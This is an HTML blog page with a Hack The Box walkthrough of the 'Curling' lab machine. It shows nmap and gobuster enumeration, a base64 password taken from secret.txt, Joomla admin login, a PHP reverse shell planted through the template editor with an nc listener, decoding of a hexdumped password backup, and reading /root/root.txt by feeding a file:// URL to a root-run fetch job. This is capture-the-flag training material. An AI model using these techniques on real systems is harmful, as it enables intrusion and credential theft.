<!--
Author: W3layouts
Author URL: http://w3layouts.com
-->
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>My Website </title>
    <!-- web fonts -->
    <link href="//fonts.googleapis.com/css?family=Nunito:400,600,700,800,900&display=swap" rel="stylesheet">
    <link href="//fonts.googleapis.com/css?family=Hind&display=swap" rel="stylesheet">
    <!-- //web fonts -->
    <!-- Template CSS -->
    <link rel="stylesheet" href="/assets/css/style-starter.css">
  </head>
  <body>

<section class="w3l-bootstrap-header">
  <nav class="navbar navbar-expand-lg navbar-light py-lg-3 py-2">
    <div class="container">
      <a class="navbar-brand" href="index.html"> My Website</a>
      <!-- if logo is image enable this   
    <a class="navbar-brand" href="#index.html">
        <img src="image-path" alt="Your logo" title="Your logo" style="height:35px;" />
    </a> -->
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon fa fa-bars"></span>
      </button>

      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/index.html">Home</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/Projects.html">Projects</a>
          </li>
        </ul>
        
      </div>
    </div>
  </nav>
</section>
<section class="w3l-about-breadcrum">
  <div class="breadcrum-bg">
    <div class="container py-5">
      <p><a href="index.html">Home</a> &nbsp; / &nbsp; Posts &nbsp;/ &nbsp; Curling</p>
     </div>
  </div>
</section>
<!-- w3l-content-photo-5 -->
<div class="w3l-content-photo-5 py-5" id="about">
	<div class="content-main pt-lg-5 pt-md-3 pb-0">
		<div class="container">
            <div style="text-align:center;padding-top: 10px">
           					<a ><img src="/Posts/Curling/0.png" class="img-fluid" alt="content-photo" ></a>
                    <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Curling</h3>
					          <p class="mb-2">Posted on 6/17</p>
                    <p class="mb-2">Source: <a href="https://www.hackthebox.eu/" target="_blank" style="color: #33cc33;text-align:right"> hackthebox</a></p>
                    <h3 class="mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Enumeration</h3>
                    <p class="mb-2">As always:</p>
            </div>
            <div class=hljs>
                <a>
                kali@kali:~/hackthebox/Practice/Curling$ nmap -sC -sV -p- 10.10.10.150 -oN nmap.txt<br>
                Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-18 10:41 EDT<br>
                Nmap scan report for 10.10.10.150<br>
                Host is up (0.037s latency).<br>
                Not shown: 65533 closed ports<br>
                PORT   STATE SERVICE VERSION<br>
                22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br>
                | ssh-hostkey: <br>
                |   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)<br>
                |   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)<br>
                |_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)<br>
                80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>
                |_http-generator: Joomla! - Open Source Content Management<br>
                |_http-server-header: Apache/2.4.29 (Ubuntu)<br>
                |_http-title: Home<br>
                Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>
                <br>
                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
                Nmap done: 1 IP address (1 host up) scanned in 46.43 seconds
                </a> 
            </div>
            <div style="text-align:center;padding-top: 10px">
              <p class="mb-2" style="font-weight:100">We only have to worry about two ports, so lets start with the web app as we don't have ssh credentials. </p>
     					<a ><img src="/Posts/Curling/1.png" class="img-fluid" alt="content-photo" ></a>
              <p class="mb-2" style="font-weight:100">And we see a blog post about curling. A couple usernames we see are floris and Super User. 
              Lets start gobuster...
              </p>
            </div>
            <div class="hljs">
              <a>
                kali@kali:~/hackthebox/Practice/Curling$ ~/Downloads/gobuster/gobuster dir 
                -u 10.10.10.150 -w /usr/share/wordlists/dirb/directory-list-1.0.txt -x php,html,log,txt<br>
                ===============================================================<br>
                Gobuster v3.0.1<br>
                by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)<br>
                ===============================================================<br>
                [+] Url:            http://10.10.10.150<br>
                [+] Threads:        10<br>
                [+] Wordlist:       /usr/share/wordlists/dirb/directory-list-1.0.txt<br>
                [+] Status codes:   200,204,301,302,307,401,403<br>
                [+] User Agent:     gobuster/3.0.1<br>
                [+] Extensions:     php,html,log,txt<br>
                [+] Timeout:        10s<br>
                ===============================================================<br>
                2020/06/18 10:48:01 Starting gobuster<br>
                ===============================================================<br>
                /images (Status: 301)<br>
                /media (Status: 301)<br>
                /index.php (Status: 200)<br>
                /templates (Status: 301)<br>
                /bin (Status: 301)<br>
                /libraries (Status: 301)<br>
                /includes (Status: 301)<br>
                /plugins (Status: 301)<br>
                /language (Status: 301)<br>
                /modules (Status: 301)<br>
                /tmp (Status: 301)<br>
                /cache (Status: 301)<br>
                /secret.txt (Status: 200)<br>
                /configuration.php (Status: 200)<br>
                /layouts (Status: 301)<br>
              </a>
            </div>
            <div style="text-align:center;padding-top: 10px">
            <p class="mb-2" style="font-weight:100">
            We found two things, /administrator
             </p>
            <a><img src="/Posts/Curling/2.png" class="img-fluid" alt="content-photo" ></a>
            
            <p class="mb-2" style="font-weight:100">
              and /secret.txt           
            </p>
            <a><img src="/Posts/Curling/3.png" class="img-fluid" alt="content-photo" ></a>
            <p class="mb-2" style="font-weight:100">
              And it turns out to be base64 encoded so lets see what it's hiding.           
            </p>
            </div>
            <div class="hljs">
            <a>
            kali@kali:~$ echo 'Q3VybGluZzIwMTgh' | base64 -d <br>
            Curling2018!
            </a>
            </div>
            <div style="text-align:center;padding-top: 10px">
            <p class="mb-2" style="font-weight:100">
            And with the credentials floris:Curling2018! we are able to login to the admin panel.             
            </p>
            <a><img src="/Posts/Curling/4.png" class="img-fluid" alt="content-photo" ></a>
            <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Foothold</h3>
            </div>
            
            <div style="text-align:center;padding-top: 10px">
            <p class="mb-2" style="font-weight:100">
            After poking around, we find a media panel to upload pictures, 
            so I tried to upload a php reverse shell but it gave me notice telling me that the file was unsafe. 
            But I did find a php editor where we can edit the php to give me a reverse shell and then use the preview feature to trigger it. 
            The php shell I used is available here: <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" style="color: #33cc33;text-align:right"> here.</a>
              
            </p>
            <a ><img src="/Posts/Curling/5.png" class="img-fluid" alt="content-photo" ></a>
                        <figcaption  class="mb-2" style="font-weight:50">PHP editor</figcaption>
            <p class="mb-2" style="font-weight:100">
            Now Paste our shell, change the IP address to ours, and start our listener.
            </p>
            </div>
            <div class="hljs">
            <a>
            kali@kali:~/hackthebox/Practice$ nc -l -p 1234
            </a>
            </div>
            <div style="text-align:center;padding-top: 10px">
            <p class="mb-2" style="font-weight:100">
            And click preview...
            </p>
            <a ><img src="/Posts/Curling/6.png" class="img-fluid" 
            alt="content-photo" style="max-width:100%;height:auto"> 
            And we get a shell!
            </a>
            </div>
            <div class="hljs">
            <a>
            nc -l -p 1234<br>
            Linux curling 4.15.0-22-generic #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux<br>
             15:08:15 up 27 min,  0 users,  load average: 0.06, 0.12, 0.15<br>
            USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>
            uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
            /bin/sh: 0: can't access tty; job control turned off<br>
            $ which python<br>
            $ which python3<br>
            /usr/bin/python3<br>
            $ python3 -c 'import pty;pty.spawn("/bin/bash");'<br>
            www-data@curling:/$ <br>
            </a>
            </div>
            <div style="text-align:center;padding-top: 10px">
            <p class="mb-2" style="font-weight:100">
            <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">User</h3>
            <p class="mb-2" style="font-weight:100">
            In /home/floris, we were able to find user.txt and another interesting directory,  
            /admin-area, but we didn't have read/execute priviledges yet.
            </p>
            </div>
            <div class="hljs">
            <a>
            www-data@curling:/home/floris$ ls -la<br>
            ls -la<br>
            total 44<br>
            drwxr-xr-x 6 floris floris 4096 May 22  2018 .<br>
            drwxr-xr-x 3 root   root   4096 May 22  2018 ..<br>
            lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null<br>
            -rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout<br>
            -rw-r--r-- 1 floris floris 3771 Apr  4  2018 .bashrc<br>
            drwx------ 2 floris floris 4096 May 22  2018 .cache<br>
            drwx------ 3 floris floris 4096 May 22  2018 .gnupg<br>
            drwxrwxr-x 3 floris floris 4096 May 22  2018 .local<br>
            -rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile<br>
            drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area<br>
            -rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup<br>
            -rw-r----- 1 floris floris   33 May 22  2018 user.txt<br>
            </a>
            </div>
            <div style="text-align:center;padding-top: 10px">
            <p class="mb-2" style="font-weight:100">
            But I found an interesting file called password-backup:           
            </p>
            </div>
            <div class="hljs">
            <a>
            www-data@curling:/home/floris$ file password_backup<br>
            file password_backup<br>
            password_backup: ASCII text<br>
            www-data@curling:/home/floris$ cat password_backup<br>
            cat password_backup<br>
            00000000: 425a 6839 3141 5926 5359 819b bb48 0000 BZh91AY&SY...H..<br>
            00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34 ....A...P)ava.:4<br>
            00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960 N...n.T.#.@%...`<br>
            00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000  ......z.@......<br>
            00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800 ..i.4hdi...9.h..<br>
            00000050: 000f 51a0 0064 681a 069e a190 0000 0034 ..Q..dh........4<br>
            00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0 i...5.n......J..<br>
            00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..}y..<~.x<br>
            00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931 .>...sVT.zH....1<br>
            00000090: c856 921b 1221 3385 6046 a2dd c173 0d22 .V...!3.'F...s.'<br>
            000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n....7j:X.d.R.<br>
            000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./... ....)p..<br>
            000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;.....9...P.C<br>
            000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P...HB....*..<br>
            000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P.<br>
            000000f0: 819b bb48                               ...H<br>
            www-data@curling:/home/floris$ <br>
            </a>
          </div>
          <div style="text-align:center;padding-top: 5px">
            <p class="mb-2" style="font-weight:100">
                        It turns out we are working with a hex dump.
                        Let's copy this to a text file, 
                        edit out the portion on the right, and try to revert back from the hexdump.
            </p>
          </div>
          <div class ="hljs">
          <p>
          kali@kali:~/hackthebox/Practice/Curling$ cat dump.txt<br>
            00000000 425a 6839 3141 5926 5359 819b bb48 0000  <br>
            00000010 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  <br>
            00000020 4edc cccc 6e11 5400 23ab 4025 f802 1960  <br>
            00000030 2018 0ca0 0092 1c7a 8340 0000 0000 0000  <br>
            00000040 0680 6988 3468 6469 89a6 d439 ea68 c800  <br>
            00000050 000f 51a0 0064 681a 069e a190 0000 0034  <br>
            00000060 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  <br>
            00000070 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  <br>
            00000080 f53e 0809 f073 5654 c27a 4886 dfa2 e931  <br>
            00000090 c856 921b 1221 3385 6046 a2dd c173 0d22  <br>
            000000a0 b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  <br>
            000000b0 ad6b b12f 0813 8120 8205 a5f5 2970 c503  <br>
            000000c0 37db ab3b e000 ef85 f439 a414 8850 1843  <br>
            000000d0 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  <br>
            000000e0 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  <br>
            000000f0 819b bb48<br>
            kali@kali:~/hackthebox/Practice/Curling$ xxd -r dump.txt  dump<br>
            kali@kali:~/hackthebox/Practice/Curling$ file dump<br>
            dump: bzip2 compressed data, block size = 900k # What's in here?<br>
            kali@kali:~/hackthebox/Practice/Curling$ mv dump dump.bz2<br>
            kali@kali:~/hackthebox/Practice/Curling$ bzip2 -d dump.bz2<br>
            kali@kali:~/hackthebox/Practice/Curling$ file dump<br>
            dump: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141<br>
            kali@kali:~/hackthebox/Practice/Curling$ mv dump dump.tgz   <br>
            kali@kali:~/hackthebox/Practice/Curling$ gunzip dump.tgz<br>
            kali@kali:~/hackthebox/Practice/Curling$ tar -xvf dump.tar<br>
            password.txt<br>
            kali@kali:~/hackthebox/Practice/Curling$ cat password.txt <br>
            5dwdCbdZu)|hChXll<br>
          </p>
          </div>          
          <div style="text-align:center;padding-top: 10px">
            <p class="mb-2" style="font-weight:100">
            Great, let's log into floris!
            </p>      
            </div>
            <div class="hljs">
            <a>
            www-data@curling:/home/floris$ su floris<br>
            su floris<br>
            Password: 5dwdCbdZu)|hChXll<br>
            <br>
            floris@curling:~$ ls<br>
            ls<br>
            admin-area  password_backup  user.txt<br>
            floris@curling:~$ cat user<br>
            cat user.txt <br>
            65dd1df0713b40d88ead98cf11b8530b<br>
            floris@curling:~$ <br>
            </a>
            </div>
            <div style="text-align:center;padding-top: 10px">      
            <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Priviledge Escalation</h3>
            <p class="mb-2" style="font-weight:100">
            Now that we have more access, let's try to see what's in the admin area.
            </p>
          </div>
          <div class="hljs">
          <a>
          floris@curling:~$ cd admin-area<br>
          cd admin-area/<br>
          floris@curling:~/admin-area$ ls<br>
          ls<br>
          input  report<br>
          floris@curling:~/admin-area$ cat input<br>
          cat input<br>
          url = "http://127.0.0.1"<br>
          floris@curling:~/admin-area$ cat report<br>
          cat report<br>
          WARNING: Failed to daemonise.  This is quite common and not fatal.<br>
          Connection refused (111)<br>
          floris@curling:~/admin-area$<br> 
          </a>
          </div>
          <div style="text-align:center;padding-top: 10px">
          <p class="mb-2" style="font-weight:100">
            Interesting, maybe try changing the url input?
          </p>
          </div>
          <div class="hljs">
          <a>
          floris@curling:~/admin-area$ echo 'url = "http://127.0.0.1/secret.txt"' > input<br>
          < echo 'url = "http://127.0.0.1/secret.txt"' > input<br>
          floris@curling:~/admin-area$ cat input<br>
          cat input<br>
          url = "http://127.0.0.1/secret.txt" #Wait a few seconds<br>
          floris@curling:~/admin-area$ cat report<br>
          cat report<br>
          Q3VybGluZzIwMTgh<br>
          </a>
          </div>
          <div style="text-align:center;padding-top: 10px">
          <p class="mb-2" style="font-weight:100">
          So we can use this to access the system files,
          lets change the input again.          </p>
          </div>
          <div class="hljs">
          <a>
          floris@curling:~/admin-area$ echo 'url = "file:///root/root.txt"' > input<br>
          echo 'url = "file:///root/root.txt"' > input<br>
          floris@curling:~/admin-area$ cat report<br>
          cat report<br>
          82c198ab6fc5365fdc6da2ee5c26064a<br>
          </a>
          </div>
     </div>
  </div>  
</div>

 <section class="w3l-footer-29-main" id="footer">
  <div class="footer-29 text-center">
      <div class="container">
        
          <div class="bottom-copies text-center">
              <p class="copy-footer-29">© 2020 My Website. All rights reserved | Designed by <a href="https://w3layouts.com">W3layouts</a></p>
               
          </div>
      </div>
  </div>
   <!-- move top -->
  <button onclick="topFunction()" id="movetop" title="Go to top">
              <span class="fa fa-angle-up"></span>
                 </button>
                 <script>
                     // When the user scrolls down 20px from the top of the document, show the button
                     window.onscroll = function () {
                         scrollFunction()
                     };
              
                     function scrollFunction() {
                         if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                             document.getElementById("movetop").style.display = "block";
                         } else {
                             document.getElementById("movetop").style.display = "none";
                         }
                     }
              
                     // When the user clicks on the button, scroll to the top of the document
                     function topFunction() {
                         document.body.scrollTop = 0;
                         document.documentElement.scrollTop = 0;
                     }
                 </script>
                 <!-- /move top -->
</section>
<!-- // grids block 5 -->
<script src="assets/js/jquery-3.3.1.min.js"></script>
<!-- //footer-28 block -->
</section>

<script>
    $(function () {
      $('.navbar-toggler').click(function () {
        $('body').toggleClass('noscroll');
      })
    });
  </script>
  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
  <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
    integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous">
  </script>
  
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
    integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous">
  </script>

<!-- Smooth scrolling -->



</body>

</html>
<!-- // grids block 5 -->

